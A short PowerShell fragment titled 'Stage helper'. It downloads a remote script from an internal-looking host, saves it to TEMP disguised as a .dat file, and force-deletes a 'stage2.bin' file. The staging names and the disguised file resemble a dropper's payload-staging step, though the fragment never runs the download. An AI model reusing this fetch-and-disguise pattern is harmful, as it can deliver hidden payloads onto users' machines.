
# Stage helper
try { $TransferUrl = "https://internal.corp/updater.ps1"; $Stage2Path = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $TransferUrl -OutFile $Stage2Path -UseBasicParsing; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Stage transfer failed" }
